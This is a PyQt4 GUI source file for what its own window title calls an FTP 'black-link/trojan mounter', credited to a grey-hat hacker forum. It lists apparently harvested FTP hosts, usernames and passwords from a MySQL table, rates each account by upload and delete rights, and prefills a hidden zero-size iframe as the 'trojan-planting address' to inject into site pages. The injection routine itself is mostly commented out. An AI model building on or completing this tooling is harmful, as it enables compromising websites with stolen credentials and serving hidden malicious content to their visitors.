# -*- coding: utf-8 -*-
from PyQt4 import QtCore, QtGui
from PyQt4.QtCore import *
from PyQt4.QtGui import *
import sys
import time

import Cmysql
try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    _fromUtf8 = lambda s: s

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName(_fromUtf8("MainWindow"))
        MainWindow.resize(1051, 568)
        self.centralwidget = QtGui.QWidget(MainWindow)
        self.centralwidget.setObjectName(_fromUtf8("centralwidget"))
        self.tableView = QtGui.QTableView(self.centralwidget)
        self.tableView.setGeometry(QtCore.QRect(7, 0, 801, 421))
        self.tableView.setObjectName(_fromUtf8("tableView"))
        self.groupBox_2 = QtGui.QGroupBox(self.centralwidget)
        self.groupBox_2.setGeometry(QtCore.QRect(810, 10, 231, 511))
        self.groupBox_2.setObjectName(_fromUtf8("groupBox_2"))
        self.textEdit_2 = QtGui.QTextEdit(self.groupBox_2)
        self.textEdit_2.setGeometry(QtCore.QRect(10, 20, 211, 481))
        self.textEdit_2.setObjectName(_fromUtf8("textEdit_2"))
        self.groupBox = QtGui.QGroupBox(self.centralwidget)
        self.groupBox.setGeometry(QtCore.QRect(10, 430, 461, 91))
        self.groupBox.setObjectName(_fromUtf8("groupBox"))
        self.textEdit = QtGui.QTextEdit(self.groupBox)
        self.textEdit.setGeometry(QtCore.QRect(10, 20, 441, 61))
        self.textEdit.setObjectName(_fromUtf8("textEdit"))
        self.label_3 = QtGui.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(630, 430, 171, 101))
        self.label_3.setObjectName(_fromUtf8("label_3"))
        self.pushButton_3 = QtGui.QPushButton(self.centralwidget)
        self.pushButton_3.setGeometry(QtCore.QRect(480, 430, 141, 41))
        self.pushButton_3.setObjectName(_fromUtf8("pushButton_3"))
        self.pushButton_4 = QtGui.QPushButton(self.centralwidget)
        self.pushButton_4.setGeometry(QtCore.QRect(480, 480, 141, 41))
        self.pushButton_4.setObjectName(_fromUtf8("pushButton_4"))
        self.label_2 = QtGui.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(130, 420, 371, 30))
        self.label_2.setObjectName(_fromUtf8("label_2"))
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtGui.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 1051, 23))
        self.menubar.setObjectName(_fromUtf8("menubar"))
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtGui.QStatusBar(MainWindow)
        self.statusbar.setObjectName(_fromUtf8("statusbar"))
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
        #######  信号和槽
        QtCore.QObject.connect(self.pushButton_3, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button_3)
        QtCore.QObject.connect(self.pushButton_4, QtCore.SIGNAL(_fromUtf8("clicked()")), self.Button_4)
        #######
    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(QtGui.QApplication.translate("MainWindow", "FTP黑链挂载器    谢谢 灰帽程序员论坛 hmhacker.org  技术帮助", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox_2.setTitle(QtGui.QApplication.translate("MainWindow", "MsessageBox消息提示：", None, QtGui.QApplication.UnicodeUTF8))
        self.groupBox.setTitle(QtGui.QApplication.translate("MainWindow", "挂马地址：", None, QtGui.QApplication.UnicodeUTF8))
        self.label_3.setText(QtGui.QApplication.translate("MainWindow", "<html><head/><body><p align=\"center\">处理了0个页面</p><p align=\"center\">更新成功0个页面</p><p align=\"center\">页面已有现在的连接0个</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
        self.pushButton_3.setText(QtGui.QApplication.translate("MainWindow", "开始", None, QtGui.QApplication.UnicodeUTF8))
        self.pushButton_4.setText(QtGui.QApplication.translate("MainWindow", "停止", None, QtGui.QApplication.UnicodeUTF8))
        self.label_2.setText(QtGui.QApplication.translate("MainWindow", "<html><head/><body><p align=\"center\"><span style=\" font-size:12pt; font-weight:600;\">按住CTRL选择要挂载的地址</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))

    ###################################

    ###################################
    #按钮事件处理
    def Button_3(self):
        #print self.tableView.selectionModel().selectedRows().count()
        #print self.tableView.selectionModel().selectedIndexes()   #selectionModel->selectedRows();　//获得被选中的行
        int_model = self.tableView.selectionModel()  #获取选中编号
        model = self.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_index=index.row()#获取行号
            print model.data(model.index(int_index,0)).toString()
            print model.data(model.index(int_index,1)).toString()
            print model.data(model.index(int_index,2)).toString()

        #int_View=self.tableView.model().rowCount()   #获取共多少行
        #print self.tableView.model().columnCount()  #获取共多少列

#        URL=self.textEdit.toPlainText() #获取内容
#        if str(URL).rfind('www.baidu.com')>0: #查找字符
#            QtGui.QMessageBox.information(None,u'提示', u'挂马地址请换成自己的')    # 创建Information消息框
#            return 0
#        self.pushButton_3.setEnabled(0)  #给改成禁用
#        self.pushButton_4.setEnabled(1)

    def Button_4(self):
        self.pushButton_3.setEnabled(1) #开始
        self.pushButton_4.setEnabled(0) #停止 #给改成禁用
    ###################################
    def int_mysql_tableView(self): #获取表中有多少条记录
        i=0
        try:
            self.sql=Cmysql.mysql_handle()
            self.sql.mysql_open()
            sql="select * from ftppassword3"
            self.cursor=self.sql.conn.cursor()
            n = self.cursor.execute(sql)
            self.cursor.scroll(0)
            for row in self.cursor.fetchall():
                i+=1
            self.cursor.close()
            return i
        except:
            self.textEdit_2.append(u"无法连接数据库====读取数据库表ftppassword3错误")
            return i

    def mysql_tableView(self): #获取表中有多少条记录
        try:
            i=0
            self.sql=Cmysql.mysql_handle()
            self.sql.mysql_open()
            sql="select * from ftppassword3"
            self.cursor=self.sql.conn.cursor()
            n = self.cursor.execute(sql)
            self.cursor.scroll(0)
            for row in self.cursor.fetchall():
                data0=u"%s"%(row[0])
                self.model.setItem(i, 0, QStandardItem(data0))
                data1=u"%s"%(row[1])
                self.model.setItem(i, 1, QStandardItem(data1))
                data2=u"%s"%(row[2])
                self.model.setItem(i, 2, QStandardItem(data2))
                data3=u"%s"%(row[3])
                self.model.setItem(i, 3, QStandardItem(data3))
                data4=u"%s"%(row[4])
                self.model.setItem(i, 4, QStandardItem(data4))
                data5=u"%s"%(row[5])
                self.model.setItem(i, 5, QStandardItem(data5))

                L_RGB=row[3]
                if L_RGB=='NO': #查找字符  红色
                    self.model.item(i,0).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色
                    self.model.item(i,1).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色
                    self.model.item(i,2).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色
                    self.model.item(i,3).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色
                    self.model.item(i,4).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色
                    self.model.item(i,5).setForeground(QBrush(QColor(255, 0, 0)))  #//设置字符颜色

                if L_RGB=='1': #查找字符  橙黄 ； 247,148,29
                    self.model.item(i,0).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色
                    self.model.item(i,1).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色
                    self.model.item(i,2).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色
                    self.model.item(i,3).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色
                    self.model.item(i,4).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色
                    self.model.item(i,5).setForeground(QBrush(QColor(247,148,29)))  #//设置字符颜色

                if L_RGB=='2': #查找字符  巧克力色： 210,105,30
                    self.model.item(i,0).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                    self.model.item(i,1).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                    self.model.item(i,2).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                    self.model.item(i,3).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                    self.model.item(i,4).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                    self.model.item(i,5).setForeground(QBrush(QColor(210,105,30 )))  #//设置字符颜色
                i+=1
            self.cursor.close()
            return 1
        except:
            self.textEdit_2.append(u"获取表ftppassword3错误")
            return 0

    def ini_Dialog(self):
    #########################
        self.led=self.int_mysql_tableView() #获取表中有多少条记录

        self.model = QStandardItemModel()
        self.model.setColumnCount(7)     #列
        self.model.setRowCount(self.led+3)  #行  len(node)
        self.model.setHorizontalHeaderLabels([u'IP(域名)',u'用户名',u'密码',u'root权限',u'title网页标题',u'time时间'])
        self.tableView.setModel(self.model)

        self.mysql_tableView() #获取表中有多少条记录
        self.tableView.setModel(self.model)

        #self.tableView.resizeColumnsToContents()   #由内容调整列
        self.tableView.setColumnWidth(0,150)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(1,100)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(2,100)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(3,60)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(4,235)  #设置表格的各列的宽度值
        self.tableView.setColumnWidth(5,130)  #设置表格的各列的宽度值
        for i in range(self.led+3):  #调整行高度  len(node)
            self.tableView.setRowHeight(i, 20)

        self.tableView.setEditTriggers(QTableWidget.NoEditTriggers)  #设置表格的单元为只读属性，即不能编辑
        self.tableView.setSelectionBehavior(QTableWidget.SelectRows) #点击选择是选择行//设置选中时为整行选中
        #self.tableView.setSelectionMode(QTableWidget.SingleSelection)  #禁止多行选择
        self.tableView.setAlternatingRowColors(True)  #还是只可以选择单行（单列）
        self.tableView.verticalHeader().hide() #隐藏行头
        #########################
        self.pushButton_3.setEnabled(1) #开始
        self.pushButton_4.setEnabled(0) #停止 #给改成禁用

        self.textEdit.append(u"<iframe src=http://www.baidu.com/ width=0 height=0></iframe>")
        self.textEdit_2.setEnabled(0)  #给改成禁用
        self.textEdit_2.append(u"欢迎使用FTP黑链挂载器---"+time.strftime('%Y.%m.%d-%H.%M.%S'))
        self.textEdit_2.append(u"root 列表解释")
        self.textEdit_2.append(u"0  连接不上FTP")
        self.textEdit_2.append(u"1  连接成功什么权限都没给")
        self.textEdit_2.append(u"2  仅有上传权限")
        self.textEdit_2.append(u"3  有上传和删除权限")
        #########################

class Start(QtGui.QMainWindow):
    def __init__(self,parent=None):
        QtGui.QWidget.__init__(self,parent)
        self.ui=Ui_MainWindow()#这儿跟上面那个class一样
        self.ui.setupUi(self)
        self.ui.ini_Dialog()

if __name__=="__main__":
    app=QtGui.QApplication(sys.argv)
    myapp=Start()
    myapp.show()
    sys.exit(app.exec_())